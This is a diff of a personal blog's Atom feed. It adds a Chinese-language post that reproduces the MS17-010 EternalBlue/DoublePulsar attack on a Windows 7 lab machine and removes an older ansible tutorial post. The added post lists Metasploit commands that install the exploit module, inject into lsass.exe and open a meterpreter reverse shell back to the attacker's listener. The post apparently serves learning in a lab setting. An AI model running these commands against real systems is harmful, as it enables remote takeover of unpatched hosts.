@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://t1ger.github.io/"/>
-  <updated>2017-04-25T11:56:38.779Z</updated>
+  <updated>2017-05-16T14:01:15.340Z</updated>
   <id>https://t1ger.github.io/</id>
   
   <author>
@@ -14,6 +14,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>方程式-ms17-010复现</title>
+    <link href="https://t1ger.github.io/2017/05/16/%E6%96%B9%E7%A8%8B%E5%BC%8F-ms17-010%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://t1ger.github.io/2017/05/16/方程式-ms17-010复现/</id>
+    <published>2017-05-16T14:28:33.000Z</published>
+    <updated>2017-05-16T14:01:15.340Z</updated>
+    
+    <content type="html"><![CDATA[<p>0x01 环境介绍:</p>
+<p>目标机win7 x86: 192.168.1.120</p>
+<p>控制机Kail: 192.168.1.99</p>
+<p>0x02 环境准备</p>
+<p>利用模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>wine可以在linux下运行windows程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install wine </div><div class="line">wine cmd.exe  打开cmd.exe,exit退出</div></pre></td></tr></table></figure></p>
+<p>将链接的文件克隆到kali中，并将eternalblue_doublepulsar.rb移动至metasploit的exploit/windows/smb文件夹中,具体路径为/usr/share/metasploit-framework/modules/exploits/windows/smb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</div><div class="line">cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
+<p>0x03 利用过程</p>
+<p>设置参数，按照实际情况设置，DOUBLEPULSARPATH和ETERNALBLUEPATH指向从github下载的deps文件夹即可，里面包含了DOUBLEPULSAR和ETERNALBLUE所需的dll<br>设置一个payload<br>注意：如果靶机为64位，改为set payload windows/x64/meterpreter/reverse_tcp</p>
+<p>然后打开msfconsole<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">use exploit/windows/smb/eternalblue_doublepulsar</div><div class="line">#set   DOUBLEPULSARPATH  /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">#set  ETERNALBLUEPATH   /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</div><div class="line">set processinject lsass.exe</div><div class="line">#set TARGETARCHITECTURE  x64</div><div class="line">set rhost 192.168.1.120</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.99</div><div class="line">show targess </div><div class="line">set target 9</div><div class="line">options </div><div class="line">run</div></pre></td></tr></table></figure></p>
+<p>最后在msf下可以看到成功反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;sysinfo</div><div class="line">meterpreter&gt;shell</div></pre></td></tr></table></figure></p>
+<p>ref<br><a href="http://www.cnblogs.com/backlion/p/6804863.html" target="_blank" rel="external">smb(ms17-010)远程命令执行之msf</a><br><a href="http://www.jianshu.com/p/ceb184b3dbc3" target="_blank" rel="external">ms17-010</a><br><a href="http://mt.sohu.com/20170505/n491866402.shtml" target="_blank" rel="external">方程式利用-不需Fuzzbunch完美入侵windows</a><br><a href="https://www.t00ls.net/articles-39343.html" target="_blank" rel="external">方程式ETERNALBLUE 之fb.py的复现</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;0x01 环境介绍:&lt;/p&gt;
+&lt;p&gt;目标机win7 x86: 192.168.1.120&lt;/p&gt;
+&lt;p&gt;控制机Kail: 192.168.1.99&lt;/p&gt;
+&lt;p&gt;0x02 环境准备&lt;/p&gt;
+&lt;p&gt;利用模块：&lt;a href=&quot;https://github.com/Eleven
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>docker私有registry配置nginx反向代理</title>
@@ -364,101 +397,6 @@
     <summary type="html">
     
       &lt;h5 id=&quot;Install-rpm-build-Package&quot;&gt;&lt;a href=&quot;#Install-rpm-build-Package&quot; class=&quot;headerlink&quot; title=&quot;Install rpm-build Package&quot;&gt;&lt;/a&gt;&lt;b&gt;Install 
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ansible使用指北(三)</title>
-    <link href="https://t1ger.github.io/2016/12/14/ansible%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97-%E4%B8%89/"/>
-    <id>https://t1ger.github.io/2016/12/14/ansible使用指北-三/</id>
-    <published>2016-12-14T06:48:45.000Z</published>
-    <updated>2016-12-14T08:48:43.986Z</updated>
-    
-    <content type="html"><![CDATA[<p>前言<br>在前面文章中我们认识了ansible的常用功能，今天我们来了解下ansible变量和ansible api,之后我们来看看如何优化ansible的性能</p>
-<h5 id="ansible变量"><a href="#ansible变量" class="headerlink" title="ansible变量"></a><b>ansible变量</b></h5><ul>
-<li><p>在Inventory中定义变量</p>
-<ul>
-<li><p>主机与组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mail.example.com</div><div class="line">[webservers]</div><div class="line">foo.example.com</div><div class="line">bar.example.com</div><div class="line">[dbservers]</div><div class="line">one.example.com</div><div class="line">two.example.com</div><div class="line">three.example.com</div></pre></td></tr></table></figure>
-</li>
-<li><p>主机变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[atlanta]</div><div class="line">host1 http_port=80 maxRequestsPerChild=808</div><div class="line">host2 http_port=303 maxRequestsPerChild=909</div></pre></td></tr></table></figure>
-</li>
-<li><p>组的变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[atlanta]</div><div class="line">host1</div><div class="line">host2</div><div class="line">[atlanta:vars]</div><div class="line">ntp_server=ntp.atlanta.example.com</div><div class="line">proxy=proxy.atlanta.example.com</div></pre></td></tr></table></figure>
-</li>
-<li><p>把一个组作为另一个组的子成员</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[atlanta]</div><div class="line">host1</div><div class="line">host2</div><div class="line">[raleigh]</div><div class="line">host2</div><div class="line">host3</div><div class="line">[southeast:children]</div><div class="line">atlanta</div><div class="line">raleigh</div><div class="line">[southeast:vars]</div><div class="line">some_server=foo.southeast.example.com</div><div class="line">halon_system_timeout=30</div><div class="line">self_destruct_countdown=60</div><div class="line">escape_pods=2</div><div class="line">[usa:children]</div><div class="line">southeast</div><div class="line">northeast</div><div class="line">southwest</div><div class="line">northwest</div></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>在playbook中定义变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- hosts: webservers</div><div class="line">  vars:</div><div class="line">    http_port: 80</div></pre></td></tr></table></figure>
-</li>
-<li><p>在文件和role中定义变量<br>角色默认变量允许你为 included roles 或者 dependent roles(见下) 设置默认变量。要创建默认变量，只需在 roles 目录下添加 defaults/main.yml 文件。这些变量在所有可用变量中拥有最低优先级，可能被其他地方定义的变量(包括 inventory 中的变量)所覆盖</p>
-</li>
-<li><p>使用变量: 关于Jinja2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#简单的模板中</div><div class="line">My amp goes to &#123;&#123; max_amp_value &#125;&#125;</div><div class="line"></div><div class="line">#在playbook中直接这样用</div><div class="line">template: src=foo.cfg.j2 dest=&#123;&#123; remote_install_path &#125;&#125;/foo.cfg</div></pre></td></tr></table></figure>
-</li>
-<li><p>注册变量<br>变量的另一个主要用途是在运行命令时,把命令结果存储到一个变量中.不同模块的执行结果是不同的.运行playbook时使用-v选项可以看到可能的结果值. 在ansible执行任务的结果值可以保存在变量中,以便稍后使用它.在 条件选择 章节有一些示例.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">- hosts: web_servers</div><div class="line">  tasks:</div><div class="line">     - shell: /usr/bin/foo</div><div class="line">       register: foo_result</div><div class="line">       ignore_errors: True</div><div class="line">     - shell: /usr/bin/bar</div><div class="line">       when: foo_result.rc == 5</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h5 id="ansible-api"><a href="#ansible-api" class="headerlink" title="ansible api"></a><b>ansible api</b></h5><p>ansible api 方便对结果输出的整形，以及二次开发及和其他程序之间的耦合调用，先来个简单例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import ansible.runner</div><div class="line">runner = ansible.runner.Runner(</div><div class="line">   module_name=&apos;ping&apos;,</div><div class="line">   module_args=&apos;&apos;,</div><div class="line">   pattern=&apos;web*&apos;,</div><div class="line">   forks=10</div><div class="line">)</div><div class="line">datastructure = runner.run()</div></pre></td></tr></table></figure></p>
-<p>结果如下，有兴趣的同学可以对比用命令行输出的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;dark&quot; : &#123;</div><div class="line">       &quot;web1.example.com&quot; : &quot;failure message&quot;</div><div class="line">    &#125;,</div><div class="line">    &quot;contacted&quot; : &#123;</div><div class="line">       &quot;web2.example.com&quot; : 1</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>看个详细的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"></div><div class="line">import ansible.runner</div><div class="line">import sys</div><div class="line"></div><div class="line"># construct the ansible runner and execute on all hosts</div><div class="line">results = ansible.runner.Runner(</div><div class="line">    pattern=&apos;*&apos;, forks=10,</div><div class="line">    module_name=&apos;command&apos;, module_args=&apos;/usr/bin/uptime&apos;,</div><div class="line">).run()</div><div class="line"></div><div class="line">if results is None:</div><div class="line">   print &quot;No hosts found&quot;</div><div class="line">   sys.exit(1)</div><div class="line"></div><div class="line">print &quot;UP ***********&quot;</div><div class="line">for (hostname, result) in results[&apos;contacted&apos;].items():</div><div class="line">    if not &apos;failed&apos; in result:</div><div class="line">        print &quot;%s &gt;&gt;&gt; %s&quot; % (hostname, result[&apos;stdout&apos;])</div><div class="line"></div><div class="line">print &quot;FAILED *******&quot;</div><div class="line">for (hostname, result) in results[&apos;contacted&apos;].items():</div><div class="line">    if &apos;failed&apos; in result:</div><div class="line">        print &quot;%s &gt;&gt;&gt; %s&quot; % (hostname, result[&apos;msg&apos;])</div><div class="line"></div><div class="line">print &quot;DOWN *********&quot;</div><div class="line">for (hostname, result) in results[&apos;dark&apos;].items():</div><div class="line">    print &quot;%s &gt;&gt;&gt; %s&quot; % (hostname, result)</div></pre></td></tr></table></figure></p>
-<p>上面的示例基本上都是参照<a href="http://docs.ansible.com/ansible/dev_guide/developing_api.html#python-api-2-0" target="_blank" rel="external">官方页面</a>进行执行的，更多用法可以通过pydoc ansible或者通过python里的help(ansible)查看。另外在多主机执行时，可以使用async(异部)方式运行</p>
-<h5 id="ansible-性能优化"><a href="#ansible-性能优化" class="headerlink" title="ansible 性能优化"></a><b>ansible 性能优化</b></h5><ul>
-<li><p>优化前的准备—收集数据<br>在 github 发现一个 Ansible 任务计时插件“ansible-profile”，安装这个插件后会显示 ansible-playbook 执行每一个任务所花费的时间。Github 地址：<a href="https://github.com/jlafon/ansible-profile。" target="_blank" rel="external">https://github.com/jlafon/ansible-profile。</a> 这个插件安装很简单，只需要简单的三个命令即可完成安装。在你的 playbook 文件的目录下创建一个目录，目录名 callback_plugins 然后将下载的 profile_tasks.py 文件放到该目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cd /etc/ansible </div><div class="line">mkdir callback_plugins </div><div class="line">cd callback_plugins </div><div class="line">wget https://raw.githubusercontent.com/jlafon/ansible-profile/master/callback_plugins/profile_tasks.py</div></pre></td></tr></table></figure>
-</li>
-<li><p>关闭 gathering facts<br>如果您观察过 ansible-playbook 的执行过程中，您会发现 ansible-playbook 的第 1 个步骤总是执行 gather facts，不论你有没有在 playbook 设定这个 tasks。如果你不需要获取被控机器的 fact 数据的话，你可以关闭获取 fact 数据功能。关闭之后，可以加快 ansible-playbook 的执行效率，尤其是你管理很大量的机器时，这非常明显。关闭获取 facts 很简单，只需要在 playbook 文件中加上“gather_facts: no”即可。如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">--- </div><div class="line"> - hosts: 172.16.64.240 </div><div class="line"> gather_facts: no </div><div class="line">  remote_user: liheng </div><div class="line">  sudo: yes </div><div class="line">  roles: </div><div class="line">  - &#123;role: profile_test&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>SSH PIPElinING<br>SSH pipelining 是一个加速 Ansible 执行速度的简单方法。ssh pipelining 默认是关闭，之所以默认关闭是为了兼容不同的 sudo 配置，主要是 requiretty 选项。如果不使用 sudo，建议开启。打开此选项可以减少 ansible 执行没有传输时 ssh 在被控机器上执行任务的连接数。不过，如果使用 sudo，必须关闭 requiretty 选项。修改 /etc/ansible/ansible.cfg 文件可以开启 pipelining</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pipelining=False</div><div class="line">修改为</div><div class="line">pipelining=True</div></pre></td></tr></table></figure>
-</li>
-<li><p>ControlPersist<br>ControlPersist 特性需要高版本的 SSH 才支持，CentOS 6 默认是不支持的，如果需要使用，需要自行升级 openssh。ControlPersist 即持久化 socket，一次验证，多次通信。并且只需要修改 ssh 客户端就行，也就是 Ansible 机器即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cat ~/.ssh/config </div><div class="line"> Host * </div><div class="line">  Compression yes </div><div class="line">  ServerAliveInterval 60 </div><div class="line">  ServerAliveCountMax 5 </div><div class="line">  ControlMaster auto </div><div class="line">  ControlPath ~/.ssh/sockets/%r@%h-%p</div><div class="line">  ControlPersist 4h</div></pre></td></tr></table></figure>
-<p>  在开启了 ControlPersist 特性后，SSH 在建立了 sockets 之后，节省了每次验证和创建的时间。在网络状况不是特别理想，尤其是跨互联网的情况下，所带来的性能提升是非常可观的。有这边需求的，试试就知道了</p>
-</li>
-</ul>
-<h5 id="Ansible-playbook-技巧"><a href="#Ansible-playbook-技巧" class="headerlink" title="Ansible-playbook 技巧"></a><b>Ansible-playbook 技巧</b></h5><ul>
-<li><p>获取执行命令的输出 –Register<br>register 关键字可以存储指定命令的输出结果到一个自定义的变量中，我们通过访问这个自定义变量就可以获取到命令的输出结果。Register 的使用很方便，只需要在 task 声明 register 关键字，并自定义一个变量名就可以。如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">- name: echo date </div><div class="line">  command: date </div><div class="line">  register: date_output </div><div class="line"></div><div class="line"> - name: echo date_output </div><div class="line">  command: echo &quot;30&quot;</div><div class="line">  when: date_output.stdout.split(&apos; &apos;)[2] == &quot;30&quot;</div></pre></td></tr></table></figure>
-<p>这里第 1 个 task 是执行了一个 date 命令，register 关键字将 date 命令的输出存储到 date_output 变量名。第 2 个 task 对输出进行分析，并使用 when 对关键字对分析后的进行判断，如果匹配，则执行这个 task，不匹配就不执行。这里要重点说下的，因为 register 获取到的输出内容都是字符串，而 ansible 又是 python 写的，你可以使用 python 字符串的方法对其做处理，比如本文中使用的 split，还可以使用 find 方法。个人觉得，真是非常灵活方便</p>
-</li>
-<li><p>task委托<br>在对一组服务器 server_group1 执行操作过程中，需要在另外一台机器 A 上执行一个操作，比如在 A 服务器上添加一条 hosts 记录，这些操作必须要在一个 playbook 联动完成。也就是是说 A 服务器这个操作与 server_group1 组上的服务器有依赖关系。Ansible 默认只会在定义好的一组服务器上执行相同的操作，这个特性对于执行批处理是非常有用的。但如果在这过程中需要同时对另外 1 台机器执行操作时，就需要用到 Ansible 的任务委派功能（delegate_to）。使用 delegate_to 关键字可以委派任务到指定的机器上运行。在 playbook 的操作如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- name: add host record </div><div class="line">  shell: &apos;echo &quot;192.168.1.100 test.xyz.com&quot; &gt;&gt; /etc/hosts&apos;</div><div class="line"></div><div class="line"> - name: add host record to center server </div><div class="line">  shell: &apos;echo &quot;192.168.1.100 test.xyz.com &quot; &gt;&gt; /etc/hosts&apos;</div><div class="line">  delegate_to: 192.168.1.1</div></pre></td></tr></table></figure>
-<p>  任务委派功能还可以用于以下场景：<br>a)在部署之前将一个主机从一个负载均衡集群中删除<br>b)当你要对一个主机做改变之前去掉相应 dns 的记录<br>c)当在一个存储设备上创建 iscsi 卷的时候<br>d)当使用外的主机来检测网络出口是否正常的时候</p>
-</li>
-<li><p>本地操作功能 –local_action<br>Ansible 默认只会对控制机器执行操作，如果需要在 Ansible 本机执行操作,可以使用 delegate_to( 任务委派 ),可以使用另外一外功能实现，这就是 local_action 关键字</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">- name: add host record to center server </div><div class="line"> local_action: shell &apos;echo &quot;192.168.1.100 test.xyz.com &quot; &gt;&gt; /etc/hosts&apos;</div></pre></td></tr></table></figure>
-<p>  当然您也可以使用 connection:local 方法，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- name: add host record to center server </div><div class="line">  shell: &apos;echo &quot;192.168.1.100 test.xyz.com &quot; &gt;&gt; /etc/hosts&apos;</div><div class="line">  connection: local</div></pre></td></tr></table></figure>
-</li>
-<li><p>选择性执行 task–Tag（标签）<br>您可能因为某些原因，会创建一个很大型的 playbook，但是你可能只想想运行其中特定部分的配置而无需要运行整个 playbook 。那么这时你可能需要用到 tag 功能。示例如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">- name: yun install package </div><div class="line"> yum: name=&#123;&#123; item &#125;&#125; state=installed </div><div class="line"> with_items: </div><div class="line">    - httpd </div><div class="line">    - memcached </div><div class="line"> tags: </div><div class="line">    - packages </div><div class="line"></div><div class="line">- name: configuration modity </div><div class="line"> template: src=templates/src.j2 dest=/etc/foo.conf </div><div class="line"> tags: </div><div class="line">     - configuration</div></pre></td></tr></table></figure>
-<p>如果你只想运行 playbook 中的”configuration”和”packages”，你可以这样做</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ansible-playbook example.yml – tags &quot;configuration,packages&quot;</div></pre></td></tr></table></figure>
-<p>  如果你只想执行 playbook 中某个特定任务之外的所有任务，你可以这样做：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ansible-playbook example.yml – skip-tags &quot;configuration&quot;</div></pre></td></tr></table></figure>
-<p>tag 特性是一个不错的功能，但如果真的是要维护一个大型的 playbook，还是建议将 playbook 按功能或应用拆分成多个 playbook，然后再在主 playbook include 其他子 playbook，这样即既利于维护也方便管理</p>
-</li>
-</ul>
-<p>ref<br><a href="http://docs.ansible.com/ansible/dev_guide/developing_api.html#python-api-2-0" target="_blank" rel="external">python-api-2-0</a><br><a href="http://www.ansible.com.cn/docs/intro_inventory.html#id11" target="_blank" rel="external">Inventory </a><br><a href="http://docs.ansible.com/ansible/playbooks_variables.html" target="_blank" rel="external">Docs Variables</a><br><a href="http://www.ibm.com/developerworks/cn/linux/1608_lih_ansible/index.html?ca=drs-" target="_blank" rel="external">Ansible 进阶技巧</a><br><a href="http://www.361way.com/playbook-advanced/4443.html" target="_blank" rel="external">ansible小结（九）playbook进阶</a></p>
-<hr>
-<p>您的鼓励是我写作最大的动力</p>
-<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;前言&lt;br&gt;在前面文章中我们认识了ansible的常用功能，今天我们来了解下ansible变量和ansible api,之后我们来看看如何优化ansible的性能&lt;/p&gt;
-&lt;h5 id=&quot;ansible变量&quot;&gt;&lt;a href=&quot;#ansible变量&quot; class=&quot;head
     
     </summary>
     
